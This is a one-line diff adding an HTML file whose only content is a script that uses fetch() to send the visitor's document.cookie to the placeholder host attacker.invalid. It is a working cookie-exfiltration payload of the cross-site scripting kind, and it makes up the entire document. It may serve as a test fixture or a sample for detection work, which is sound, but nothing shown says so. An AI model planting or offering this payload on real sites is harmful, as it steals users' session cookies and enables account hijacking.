@@ -1,0 +1,1 @@
+<html><script>fetch('https://attacker.invalid/?c='+document.cookie)</script></html>
